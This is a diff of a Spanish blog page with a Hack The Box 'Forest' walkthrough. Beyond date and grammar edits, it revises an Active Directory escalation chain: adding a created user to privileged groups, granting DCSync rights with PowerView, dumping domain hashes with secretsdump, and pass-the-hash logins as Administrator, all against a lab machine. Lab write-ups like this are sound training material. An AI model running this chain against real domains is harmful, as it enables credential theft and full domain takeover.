@@ -24,11 +24,11 @@
 <meta property="og:description" content="El día de hoy vamos a resolver la máquina Forest de Hack The Box. Es una máquina Windows de nivel de dificultad medio en la intrusión, y medio en la escalada de privilegios según figura en la plataforma." />
 <meta property="og:site_name" content="Filthy Hacker" />
 <meta property="og:type" content="article" />
-<meta property="article:published_time" content="2024-07-08T00:00:00-04:00" />
+<meta property="article:published_time" content="2024-08-19T00:00:00-04:00" />
 <meta name="twitter:card" content="summary" />
 <meta property="twitter:title" content="Forest - Hack The Box" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"m4teo","url":"https://mateonitro550.github.io"},"dateModified":"2024-07-08T00:00:00-04:00","datePublished":"2024-07-08T00:00:00-04:00","description":"El día de hoy vamos a resolver la máquina Forest de Hack The Box. Es una máquina Windows de nivel de dificultad medio en la intrusión, y medio en la escalada de privilegios según figura en la plataforma.","headline":"Forest - Hack The Box","mainEntityOfPage":{"@type":"WebPage","@id":"/es/Forest-Hack-The-Box/"},"url":"/es/Forest-Hack-The-Box/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"m4teo","url":"https://mateonitro550.github.io"},"dateModified":"2024-08-19T00:00:00-04:00","datePublished":"2024-08-19T00:00:00-04:00","description":"El día de hoy vamos a resolver la máquina Forest de Hack The Box. Es una máquina Windows de nivel de dificultad medio en la intrusión, y medio en la escalada de privilegios según figura en la plataforma.","headline":"Forest - Hack The Box","mainEntityOfPage":{"@type":"WebPage","@id":"/es/Forest-Hack-The-Box/"},"url":"/es/Forest-Hack-The-Box/"}</script>
 <!-- End Jekyll SEO tag -->
 
 
@@ -72,9 +72,9 @@
       <section id="main_content">
         <article>
   <h2>Forest - Hack The Box</h2>
-  <time datetime="2024-07-08T00:00:00-04:00" class="by-line">
+  <time datetime="2024-08-19T00:00:00-04:00" class="by-line">
     
-      08/07/2024
+      19/08/2024
     
   </time>
   <p>El día de hoy vamos a resolver la máquina <em>Forest</em> de <em>Hack The Box</em>. Es una máquina <em>Windows</em> de nivel de dificultad medio en la intrusión, y medio en la escalada de privilegios según figura en la plataforma.</p>
@@ -365,7 +365,7 @@
 </span><span class="n">Invoke-BloodHound</span><span class="w"> </span><span class="nt">-CollectionMethod</span><span class="w"> </span><span class="nx">All</span><span class="w">
 </span></code></pre></div></div>
 
-<p>Esto generará un archivo comprimido con toda la información del <em>AD</em>. Para descargar este archivo a nuestro equipos, utilizamos el siguiente comando:</p>
+<p>Esto generará un archivo comprimido con toda la información del <em>AD</em>. Para descargar este archivo a nuestro equipo, utilizaremos el siguiente comando:</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>download &lt;timestamp&gt;_BloodHound.zip BloodHound.zip
 </code></pre></div></div>
@@ -409,7 +409,7 @@
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/25.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>Podemos observar que <code class="language-plaintext highlighter-rouge">svc-alfresco</code> es miembro del grupo <em>Service Accounts</em>, el cual es miembro del grupo <em>Privileged IT Accounts</em>, que a su vez es miembro del grupo <em>Account Operators</em>. Además, el grupo <em>Account Operators</em> tiene permisos <em>GenericAll</em> sobre el grupo <em>Exchange Windows Permissions</em>, lo que les da control total sobre este grupo. El grupo <em>Exchange Windows Permissions</em> tiene permisos <em>WriteDacl</em> sobre el dominio, lo que permite modificar la lista de control de acceso discrecional (<em>DACL</em>) del dominio.</p>
+<p>Podemos observar que <code class="language-plaintext highlighter-rouge">svc-alfresco</code> es miembro del grupo <em>Service Accounts</em>, el cual es miembro del grupo <em>Privileged IT Accounts</em>, que a su vez es miembro del grupo <em>Account Operators</em>. Además, el grupo <em>Account Operators</em> tiene permisos <em>GenericAll</em> sobre el grupo <em>Exchange Windows Permissions</em>, lo que le da control total sobre este grupo. El grupo <em>Exchange Windows Permissions</em> tiene permisos <em>WriteDacl</em> sobre el dominio, lo que permite modificar la lista de control de acceso discrecional (<em>DACL</em>) del dominio.</p>
 
 <p>Vamos por partes, el grupo <em>Account Operators</em> otorga privilegios limitados de creación de cuentas a un usuario. Por lo tanto, el usuario <code class="language-plaintext highlighter-rouge">svc-alfresco</code> puede crear otras cuentas en el dominio. Por otra parte, el grupo <em>Account Operators</em> tiene permisos <em>GenericAll</em> sobre el grupo <em>Exchange Windows Permissions</em>, lo que significa que <code class="language-plaintext highlighter-rouge">svc-alfresco</code> puede modificar los permisos del grupo <em>Exchange Windows Permissions</em>. Finalmente, el grupo <em>Exchange Windows Permissions</em> tiene permisos <em>WriteDacl</em> sobre el dominio. Abusaremos de esto para otorgarnos privilegios de <code class="language-plaintext highlighter-rouge">DCSync</code>.</p>
 
@@ -417,55 +417,58 @@
 
 <p>Dicho todo esto, lo primero que haremos será aprovechar que <code class="language-plaintext highlighter-rouge">svc-alfresco</code> es miembro del grupo <em>Account Operators</em>, y crear un nuevo usuario. Para ello, haremos lo siguiente:</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user nombreUsuario contraseña /add /domain
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user nombreDeUsuario contraseña /add /domain
 </code></pre></div></div>
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/26.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Lo siguiente que haremos será añadir el usuario que acabamos de crear al grupo <em>Exchange Windows Permissions</em>, aprovechando que <code class="language-plaintext highlighter-rouge">svc-alfresco</code> tiene control total sobre este grupo:</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net group <span class="s2">"Exchange Windows Permissions"</span> nombreUsuario /add
-</code></pre></div></div>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Add-ADGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"Exchange Windows Permissions"</span><span class="w"> </span><span class="nt">-Members</span><span class="w"> </span><span class="s2">"nombreDeUsuario"</span><span class="w">
+</span></code></pre></div></div>
+
+<p>También vamos a añadir este usuario al grupo <em>Remote Management Users</em> para que pueda conectarse a través de <code class="language-plaintext highlighter-rouge">Evil-WinRM</code>:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Add-ADGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"Remote Management Users"</span><span class="w"> </span><span class="nt">-Members</span><span class="w"> </span><span class="s2">"nombreDeUsuario"</span><span class="w">
+</span></code></pre></div></div>
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/27.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>Finalmente, para otorgarnos permisos de <code class="language-plaintext highlighter-rouge">DCsync</code>, podemos apoyarnos en <code class="language-plaintext highlighter-rouge">BloodHound</code>, que nos da una idea de cómo realizarlo. Lo primero que haremos será descargar en nuestro equipo el script <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a>, que pertenece a <code class="language-plaintext highlighter-rouge">PowerSploit</code> (una colección de scripts en PowerShell). Igual que antes, lo subiremos mediante <code class="language-plaintext highlighter-rouge">Evil-WinRM</code> y posteriormente lo importaremos:</p>
+<p>Al añadir al usuario al grupo <em>Remote Management Users</em>, evitamos el uso de <em>PSCredentials</em>, normalmente utilizadas para ejecutar comandos con las credenciales de otro usuario, que estaban generando conflictos con <code class="language-plaintext highlighter-rouge">PowerView</code>.</p>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/28.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
-
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/29.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p>A continuación, cerraremos la sesión actual de <code class="language-plaintext highlighter-rouge">Evil-WinRM</code> y nos conectaremos nuevamente con el usuario recién creado. Una vez conectados como el nuevo usuario, descargaremos en nuestro equipo el script <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a>, que pertenece a <code class="language-plaintext highlighter-rouge">PowerSploit</code> (una colección de scripts en PowerShell). Igual que antes, lo subiremos mediante <code class="language-plaintext highlighter-rouge">Evil-WinRM</code> y posteriormente lo importaremos:</p>
 
 <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">upload</span><span class="w"> </span><span class="nx">PowerView.ps1</span><span class="w">
 </span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">
 </span></code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/30.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/28.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Una vez importado, utilizaremos la función <code class="language-plaintext highlighter-rouge">Add-DomainObjectAcl</code> para otorgar permisos de <code class="language-plaintext highlighter-rouge">DCsync</code> a nuestro usuario recién creado:</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-DomainObjectAcl <span class="nt">-TargetIdentity</span> <span class="s2">"DC=htb,DC=local"</span> <span class="nt">-PrincipalIdentity</span> nombreDeUsuario <span class="nt">-Rights</span> DCSync
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/31.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/29.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>Ya con permisos de <code class="language-plaintext highlighter-rouge">DCsync</code> en nuestro usuario, podemos utilizar <code class="language-plaintext highlighter-rouge">secretsdump</code>, otro script de la suite de <code class="language-plaintext highlighter-rouge">Impacket</code> que nos permitirá dumpear los hashes de todos los usuarios del dominio:</p>
+<p>Ya con permisos de <code class="language-plaintext highlighter-rouge">DCsync</code> en nuestro usuario, podemos utilizar <code class="language-plaintext highlighter-rouge">secretsdump</code>, otro script de la suite <code class="language-plaintext highlighter-rouge">Impacket</code> que nos permitirá dumpear los hashes de todos los usuarios del dominio:</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-secretsdump htb.local/nombreUsuario:contraseña@10.10.10.161
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-secretsdump htb.local/nombreDeUsuario:contraseña@10.10.10.161
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/32.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/30.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Finalmente, podemos realizar un ataque de tipo <code class="language-plaintext highlighter-rouge">Pass the Hash</code>, que consiste en usar el <em>hash</em> que acabamos de conseguir en lugar de la contraseña (que no conocemos) para autenticarnos. Para esto, podríamos utilizar <code class="language-plaintext highlighter-rouge">psexec</code> (otro script de <code class="language-plaintext highlighter-rouge">Impacket</code>), o bien, mediante el mismo <code class="language-plaintext highlighter-rouge">Evil-WinRM</code>:</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 10.10.10.161 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-H</span> <span class="s1">'HASH'</span>
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/33.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/31.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-psexec administrator@10.10.10.161 <span class="nt">-hash</span> HASH
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/34.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/32.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
 
 </article>
 
